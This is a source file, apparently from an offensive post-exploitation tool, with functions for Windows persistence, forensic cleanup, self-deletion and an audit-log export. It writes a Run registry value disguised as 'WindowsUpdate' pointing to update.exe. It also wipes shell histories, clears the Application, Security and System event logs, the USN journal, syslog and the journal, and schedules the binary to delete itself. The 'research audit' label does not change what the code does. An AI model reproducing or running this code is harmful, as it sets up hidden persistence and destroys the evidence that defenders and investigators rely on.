fn setup_persistence_and_registry() {
    println("[*] Setting up Windows persistence...")

    // Create registry key for persistence
    let registry_key = jocky_alloc(256)
    let ok = jocky_registry_create_key(0x80000002, "Software\\Microsoft\\Windows\\Run", registry_key)

    if ok {
        println("  [+] Registry key created")
        jocky_registry_set_value(registry_key, "WindowsUpdate", "C:\\ProgramData\\update.exe", 32, 1)
        println("  [+] Persistence value set")
        jocky_registry_close_key(registry_key)
        log_operation("persistence", "registry_set", "Software\\\\Microsoft\\\\Windows\\\\Run", "success")
    } else {
        println("  [!] Registry setup failed")
    }

    jocky_free(registry_key)
    println("")
}

fn perform_forensic_cleanup() {
    println("[*] Cleaning forensic artifacts...")

    // Windows cleanup
    println("  [*] Windows artifacts...")
    forensics_wipe_powershell_history()
    forensics_wipe_cmd_history()
    jocky_cleanup_event_logs("Application,Security,System")
    forensics_flush_arp_cache()
    forensics_clear_dns_cache()
    jocky_cleanup_usn_journal()
    println("    [+] Windows cleanup complete")

    // Linux cleanup
    println("  [*] Linux artifacts...")
    linux_forensics_wipe_bash_history()
    jocky_linux_cleanup_syslog()
    jocky_linux_cleanup_journal()
    println("    [+] Linux cleanup complete")

    log_operation("forensics", "cleanup_complete", "all_layers", "wiped")
    println("")
}

fn perform_self_deletion() {
    println("[*] Scheduling self-deletion...")

    // Windows self-delete at exit
    jocky_self_delete()

    println("  [+] Self-deletion scheduled")
    log_operation("forensics", "self_delete", "binary_path", "scheduled")
    println("")
}

fn export_audit_trail() {
    println("[*] Exporting audit trail...")

    let audit_file = "/tmp/research_audit.bin"
    audit_export(audit_file)

    let chain_valid = audit_verify()

    if chain_valid == 0 {
        println("  [+] Audit trail integrity verified")
        println("  [+] Exported to: " + audit_file)
        log_operation("audit", "export_complete", audit_file, "verified")
    } else {
        println("  [!] Audit trail integrity check FAILED")
    }

    println("")
}

